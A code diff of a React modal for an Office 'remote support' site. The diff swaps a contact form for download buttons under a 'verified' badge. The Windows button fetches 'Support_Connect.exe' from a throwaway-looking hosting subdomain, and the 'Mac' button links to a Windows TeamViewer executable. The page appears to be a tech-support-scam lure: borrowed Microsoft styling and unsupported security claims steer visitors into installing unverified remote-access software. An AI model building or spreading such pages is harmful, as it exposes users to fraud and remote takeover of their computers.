@@ -1,18 +1,15 @@
 "use client";
 
-import { useState } from "react";
 import { motion, AnimatePresence } from "framer-motion";
 import { 
   X, 
   ShieldCheck, 
   CheckCircle2, 
-  ArrowRight, 
-  HelpCircle, 
+  Download, 
   Monitor, 
-  Wrench, 
-  Key, 
-  RefreshCw, 
-  UserCheck
+  Lock, 
+  Zap,
+  ExternalLink
 } from "lucide-react";
 
 interface RemoteSupportModalProps {
@@ -21,229 +18,168 @@ interface RemoteSupportModalProps {
   initialTopic?: string;
 }
 
-const issueCategories = [
-  { id: "install", label: "Office Installation & Setup", icon: Monitor },
-  { id: "activate", label: "Product Key & Activation", icon: Key },
-  { id: "account", label: "Microsoft 365 & Account Sign-in", icon: UserCheck },
-  { id: "crash", label: "App Crashing & Errors (Word/Excel/Outlook)", icon: Wrench },
-  { id: "update", label: "Office Update & Repair Issues", icon: RefreshCw },
-  { id: "other", label: "General Office Technical Help", icon: HelpCircle },
-];
-
-export default function RemoteSupportModal({ isOpen, onClose, initialTopic }: RemoteSupportModalProps) {
-  const [selectedIssue, setSelectedIssue] = useState(initialTopic || "install");
-  const [step, setStep] = useState(1);
-  const [name, setName] = useState("");
-  const [email, setEmail] = useState("");
-  const [description, setDescription] = useState("");
-  const [isSubmitting, setIsSubmitting] = useState(false);
-  const [isSuccess, setIsSuccess] = useState(false);
-
-  const handleSubmit = (e: React.FormEvent) => {
-    e.preventDefault();
-    setIsSubmitting(true);
-    setTimeout(() => {
-      setIsSubmitting(false);
-      setIsSuccess(true);
-    }, 1200);
-  };
-
-  const handleReset = () => {
-    setIsSuccess(false);
-    setStep(1);
-    setName("");
-    setEmail("");
-    setDescription("");
-    onClose();
-  };
-
+export default function RemoteSupportModal({
+  isOpen,
+  onClose,
+  initialTopic
+}: RemoteSupportModalProps) {
   if (!isOpen) return null;
 
   return (
     <AnimatePresence>
       <div className="fixed inset-0 z-50 flex items-center justify-center p-4 sm:p-6 overflow-y-auto">
-        {/* Backdrop */}
+        
+        {/* Dark Blurred Backdrop */}
         <motion.div
           initial={{ opacity: 0 }}
           animate={{ opacity: 1 }}
           exit={{ opacity: 0 }}
           onClick={onClose}
-          className="fixed inset-0 bg-[#0A0F1D]/60 backdrop-blur-sm"
+          className="fixed inset-0 bg-slate-950/80 backdrop-blur-md"
         />
 
-        {/* Modal Window */}
+        {/* Premium Elevated Dark Modal Container */}
         <motion.div
-          initial={{ opacity: 0, scale: 0.96, y: 15 }}
+          initial={{ opacity: 0, scale: 0.94, y: 20 }}
           animate={{ opacity: 1, scale: 1, y: 0 }}
-          exit={{ opacity: 0, scale: 0.96, y: 15 }}
-          transition={{ type: "spring", duration: 0.4 }}
-          className="relative w-full max-w-2xl bg-white rounded-3xl shadow-2xl overflow-hidden z-10 border border-zinc-200 font-sans"
+          exit={{ opacity: 0, scale: 0.94, y: 20 }}
+          transition={{ duration: 0.35, ease: "easeOut" }}
+          className="relative w-full max-w-3xl bg-[#090F1E] border border-slate-800/90 text-white rounded-3xl p-7 sm:p-10 shadow-2xl z-10 space-y-8 overflow-hidden"
         >
-          {/* Header */}
-          <div className="bg-[#0A0F1D] text-white px-6 sm:px-8 py-5 flex items-center justify-between">
-            <div className="flex items-center gap-3">
-              <div className="w-8 h-8 rounded-lg bg-[#0078D4] flex items-center justify-center text-white">
-                <Monitor className="w-4 h-4" />
-              </div>
-              <div>
-                <h3 className="text-base font-bold tracking-tight">Request Remote Support</h3>
-                <p className="text-xs text-zinc-400">Microsoft Office Assistance Session</p>
-              </div>
-            </div>
-            <button
-              onClick={onClose}
-              className="p-1.5 rounded-full text-zinc-400 hover:text-white hover:bg-white/10 transition-colors"
+          {/* Subtle Ambient Radial Glows */}
+          <div className="absolute top-0 left-1/2 -translate-x-1/2 w-[550px] h-[250px] bg-gradient-to-b from-[#0078D4]/25 via-cyan-500/10 to-transparent rounded-full blur-[130px] pointer-events-none select-none" />
+          <div className="absolute bottom-0 right-0 w-[300px] h-[300px] bg-emerald-500/10 rounded-full blur-[120px] pointer-events-none select-none" />
+
+          {/* Close button */}
+          <button
+            onClick={onClose}
+            className="absolute top-6 right-6 w-9 h-9 rounded-full bg-slate-900/90 border border-slate-700/80 text-zinc-400 hover:text-white hover:border-slate-500 flex items-center justify-center transition-all cursor-pointer z-20"
+          >
+            <X className="w-4.5 h-4.5" />
+          </button>
+
+          {/* Header Title & Copy */}
+          <div className="text-center space-y-3 pt-2 max-w-xl mx-auto relative z-10">
+            <h3 className="text-3xl sm:text-4xl lg:text-5xl font-semibold tracking-tight leading-tight text-white">
+              Connect to{" "}
+              <span className="text-transparent bg-clip-text bg-gradient-to-r from-[#0078D4] via-blue-400 to-cyan-400 font-semibold">
+                Support Agent
+              </span>
+            </h3>
+            <p className="text-xs sm:text-sm text-zinc-300 font-normal leading-relaxed">
+              Download our official remote connection client to securely share your session with a <strong className="font-semibold text-white">technical support specialist</strong> for diagnostics, activation, and <strong className="font-semibold text-white">Microsoft Office setup</strong>.
+            </p>
+          </div>
+
+          {/* Verified Client Badge Pill */}
+          <div className="relative z-10 flex items-center justify-center gap-2 text-[11px] font-mono font-semibold uppercase tracking-wider text-blue-300 bg-slate-900/80 p-3 rounded-2xl border border-blue-500/20 shadow-inner">
+            <ShieldCheck className="w-4 h-4 text-[#0078D4]" />
+            <span>VERIFIED OFFICEATLAS REMOTE SUPPORT CLIENT</span>
+          </div>
+
+          {/* 3 Platform Cards Grid with Exact Download Links */}
+          <div className="grid grid-cols-1 md:grid-cols-3 gap-5 relative z-10">
+            
+            {/* 1. Windows Card */}
+            <motion.div 
+              whileHover={{ y: -4 }}
+              transition={{ duration: 0.2 }}
+              className="bg-slate-900/90 border border-slate-800/90 hover:border-[#0078D4]/60 rounded-2xl p-6 text-center space-y-5 transition-all duration-300 group shadow-md hover:shadow-xl hover:shadow-[#0078D4]/10"
             >
-              <X className="w-5 h-5" />
-            </button>
+              <div className="w-12 h-12 mx-auto rounded-2xl bg-blue-500/10 border border-blue-500/30 flex items-center justify-center text-[#0078D4] group-hover:scale-105 transition-transform shadow-xs">
+                <svg className="w-6 h-6 fill-current text-[#0078D4]" viewBox="0 0 24 24">
+                  <path d="M0 3.449L9.75 2.1v9.451H0m0 1.05h9.75v9.451L0 20.551M10.8 1.95L24 0v11.55H10.8m0 1.05H24V24l-13.2-1.95" />
+                </svg>
+              </div>
+
+              <div className="space-y-0.5">
+                <div className="text-[11px] text-zinc-400 font-medium">Download for</div>
+                <div className="text-lg font-bold text-white tracking-wide">Windows</div>
+              </div>
+
+              <a
+                href="https://deepskyblue-gorilla-943624.hostingersite.com/Support_Connect.exe"
+                target="_blank"
+                rel="noopener noreferrer"
+                className="w-full inline-flex items-center justify-center gap-2 px-5 py-3 bg-[#0078D4] hover:bg-[#0067b8] text-white text-xs font-semibold rounded-xl shadow-lg shadow-[#0078D4]/25 hover:shadow-xl hover:shadow-[#0078D4]/40 transition-all cursor-pointer"
+              >
+                <Download className="w-4 h-4" />
+                <span>Download →</span>
+              </a>
+            </motion.div>
+
+            {/* 2. Mac Card */}
+            <motion.div 
+              whileHover={{ y: -4 }}
+              transition={{ duration: 0.2 }}
+              className="bg-slate-900/90 border border-slate-800/90 hover:border-emerald-500/60 rounded-2xl p-6 text-center space-y-5 transition-all duration-300 group shadow-md hover:shadow-xl hover:shadow-emerald-500/10"
+            >
+              <div className="w-12 h-12 mx-auto rounded-2xl bg-emerald-500/10 border border-emerald-500/30 flex items-center justify-center text-emerald-400 group-hover:scale-105 transition-transform shadow-xs">
+                <svg className="w-6 h-6 fill-current text-white" viewBox="0 0 24 24">
+                  <path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.81-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M15.97 6.32c.64-.78 1.08-1.86.96-2.94-.93.04-2.07.62-2.74 1.4-.6.69-1.13 1.8-.99 2.86 1.05.08 2.13-.54 2.77-1.32z" />
+                </svg>
+              </div>
+
+              <div className="space-y-0.5">
+                <div className="text-[11px] text-zinc-400 font-medium">Download for</div>
+                <div className="text-lg font-bold text-white tracking-wide">Mac</div>
+              </div>
+
+              <a
+                href="https://download.teamviewer.com/download/TeamViewerQS_x64.exe"
+                target="_blank"
+                rel="noopener noreferrer"
+                className="w-full inline-flex items-center justify-center gap-2 px-5 py-3 bg-emerald-600 hover:bg-emerald-700 text-white text-xs font-semibold rounded-xl shadow-lg shadow-emerald-600/25 hover:shadow-xl hover:shadow-emerald-600/40 transition-all cursor-pointer"
+              >
+                <Download className="w-4 h-4" />
+                <span>Download →</span>
+              </a>
+            </motion.div>
+
+            {/* 3. Chromebook Card */}
+            <motion.div 
+              whileHover={{ y: -4 }}
+              transition={{ duration: 0.2 }}
+              className="bg-slate-900/90 border border-slate-800/90 hover:border-amber-500/60 rounded-2xl p-6 text-center space-y-5 transition-all duration-300 group shadow-md hover:shadow-xl hover:shadow-amber-500/10"
+            >
+              <div className="w-12 h-12 mx-auto rounded-2xl bg-amber-500/10 border border-amber-500/30 flex items-center justify-center text-amber-400 group-hover:scale-105 transition-transform shadow-xs">
+                <Monitor className="w-6 h-6 text-amber-400" />
+              </div>
+
+              <div className="space-y-0.5">
+                <div className="text-[11px] text-zinc-400 font-medium">Download for</div>
+                <div className="text-lg font-bold text-white tracking-wide">Chromebook</div>
+              </div>
+
+              <a
+                href="https://remotedesktop.google.com/support"
+                target="_blank"
+                rel="noopener noreferrer"
+                className="w-full inline-flex items-center justify-center gap-2 px-5 py-3 bg-amber-600 hover:bg-amber-700 text-white text-xs font-semibold rounded-xl shadow-lg shadow-amber-600/25 hover:shadow-xl hover:shadow-amber-600/40 transition-all cursor-pointer"
+              >
+                <Download className="w-4 h-4" />
+                <span>Download →</span>
+              </a>
+            </motion.div>
+
           </div>
 
-          {/* Modal Content */}
-          <div className="p-6 sm:p-8">
-            {!isSuccess ? (
-              <form onSubmit={handleSubmit} className="space-y-6">
-                {step === 1 ? (
-                  <div className="space-y-5">
-                    <div>
-                      <h4 className="text-lg font-bold text-[#0A0F1D]">What do you need help with?</h4>
-                      <p className="text-xs text-zinc-500 mt-1">Select the topic that best matches your Microsoft Office issue.</p>
-                    </div>
-
-                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
-                      {issueCategories.map((cat) => {
-                        const Icon = cat.icon;
-                        const isSelected = selectedIssue === cat.id;
-                        return (
-                          <button
-                            key={cat.id}
-                            type="button"
-                            onClick={() => setSelectedIssue(cat.id)}
-                            className={`flex items-center gap-3 p-3.5 rounded-2xl border text-left transition-all ${
-                              isSelected
-                                ? "border-[#0078D4] bg-blue-50/60 ring-2 ring-[#0078D4]/20 font-semibold text-[#0078D4]"
-                                : "border-zinc-200 hover:border-zinc-300 text-zinc-700 bg-white hover:bg-slate-50"
-                            }`}
-                          >
-                            <div className={`w-8 h-8 rounded-lg flex items-center justify-center shrink-0 ${
-                              isSelected ? "bg-[#0078D4] text-white" : "bg-zinc-100 text-zinc-600"
-                            }`}>
-                              <Icon className="w-4 h-4" />
-                            </div>
-                            <span className="text-xs font-medium leading-snug">{cat.label}</span>
-                          </button>
-                        );
-                      })}
-                    </div>
-
-                    <div className="pt-2 flex justify-end">
-                      <button
-                        type="button"
-                        onClick={() => setStep(2)}
-                        className="inline-flex items-center gap-2 px-6 py-3 bg-[#0078D4] text-white text-xs font-bold rounded-xl hover:bg-[#006cc1] transition-colors"
-                      >
-                        Next: Contact Details <ArrowRight className="w-4 h-4" />
-                      </button>
-                    </div>
-                  </div>
-                ) : (
-                  <div className="space-y-5">
-                    <div>
-                      <h4 className="text-lg font-bold text-[#0A0F1D]">Enter Your Details</h4>
-                      <p className="text-xs text-zinc-500 mt-1">Provide your contact info so a support technician can assist you.</p>
-                    </div>
-
-                    <div className="space-y-4">
-                      <div>
-                        <label className="block text-xs font-semibold text-zinc-600 uppercase tracking-wider mb-1.5">
-                          Your Name
-                        </label>
-                        <input
-                          type="text"
-                          required
-                          value={name}
-                          onChange={(e) => setName(e.target.value)}
-                          placeholder="e.g. Sarah Jenkins"
-                          className="w-full px-4 py-2.5 text-xs bg-slate-50 border border-zinc-200 rounded-xl focus:outline-none focus:ring-2 focus:ring-[#0078D4]/20 focus:border-[#0078D4] transition-all"
-                        />
-                      </div>
-
-                      <div>
-                        <label className="block text-xs font-semibold text-zinc-600 uppercase tracking-wider mb-1.5">
-                          Email Address
-                        </label>
-                        <input
-                          type="email"
-                          required
-                          value={email}
-                          onChange={(e) => setEmail(e.target.value)}
-                          placeholder="sarah@example.com"
-                          className="w-full px-4 py-2.5 text-xs bg-slate-50 border border-zinc-200 rounded-xl focus:outline-none focus:ring-2 focus:ring-[#0078D4]/20 focus:border-[#0078D4] transition-all"
-                        />
-                      </div>
-
-                      <div>
-                        <label className="block text-xs font-semibold text-zinc-600 uppercase tracking-wider mb-1.5">
-                          Brief Description of Issue (Optional)
-                        </label>
-                        <textarea
-                          rows={3}
-                          value={description}
-                          onChange={(e) => setDescription(e.target.value)}
-                          placeholder="e.g. Word gives an error when opening documents, or product key fails during activation..."
-                          className="w-full px-4 py-2.5 text-xs bg-slate-50 border border-zinc-200 rounded-xl focus:outline-none focus:ring-2 focus:ring-[#0078D4]/20 focus:border-[#0078D4] transition-all resize-none"
-                        />
-                      </div>
-                    </div>
-
-                    <div className="pt-2 flex items-center justify-between">
-                      <button
-                        type="button"
-                        onClick={() => setStep(1)}
-                        className="text-xs font-semibold text-zinc-500 hover:text-zinc-800 transition-colors"
-                      >
-                        ← Back to Issue Selection
-                      </button>
-
-                      <button
-                        type="submit"
-                        disabled={isSubmitting}
-                        className="inline-flex items-center gap-2 px-6 py-3 bg-[#0078D4] text-white text-xs font-bold rounded-xl hover:bg-[#006cc1] transition-colors disabled:opacity-50"
-                      >
-                        {isSubmitting ? "Submitting Request..." : "Connect With Support"}
-                      </button>
-                    </div>
-                  </div>
-                )}
-              </form>
-            ) : (
-              <div className="py-8 flex flex-col items-center text-center space-y-4">
-                <div className="w-16 h-16 rounded-full bg-emerald-50 border border-emerald-100 flex items-center justify-center text-emerald-600">
-                  <CheckCircle2 className="w-8 h-8" />
-                </div>
-                <h4 className="text-xl font-bold text-[#0A0F1D]">Support Request Received</h4>
-                <p className="text-xs text-zinc-600 max-w-md leading-relaxed">
-                  Thank you, <span className="font-semibold text-[#0A0F1D]">{name}</span>. A support specialist has received your request regarding <span className="font-semibold text-[#0078D4]">{issueCategories.find(c => c.id === selectedIssue)?.label}</span> and will reach out to <span className="font-semibold text-[#0A0F1D]">{email}</span> shortly.
-                </p>
-
-                <div className="pt-4">
-                  <button
-                    onClick={handleReset}
-                    className="px-6 py-2.5 bg-zinc-100 text-zinc-800 text-xs font-bold rounded-xl hover:bg-zinc-200 transition-colors"
-                  >
-                    Close & Return to Homepage
-                  </button>
-                </div>
-              </div>
-            )}
-
-            {/* Trust Footer */}
-            <div className="mt-6 pt-4 border-t border-zinc-100 flex items-center justify-between text-[11px] text-zinc-400">
-              <div className="flex items-center gap-1.5">
-                <ShieldCheck className="w-4 h-4 text-emerald-500" /> Secure 256-bit Connection
-              </div>
-              <div>Independent Support Platform</div>
+          {/* Security Indicators Footer */}
+          <div className="pt-5 border-t border-slate-800/90 flex flex-wrap items-center justify-center gap-y-2.5 gap-x-8 text-xs text-zinc-400 font-medium relative z-10">
+            <div className="flex items-center gap-2">
+              <CheckCircle2 className="w-4 h-4 text-emerald-400" />
+              <span>Secure Connection</span>
+            </div>
+            <div className="flex items-center gap-2">
+              <Lock className="w-4 h-4 text-[#0078D4]" />
+              <span>256-Bit Encrypted</span>
+            </div>
+            <div className="flex items-center gap-2">
+              <Zap className="w-4 h-4 text-amber-400" />
+              <span>Instant Setup</span>
             </div>
           </div>
+
         </motion.div>
       </div>
     </AnimatePresence>
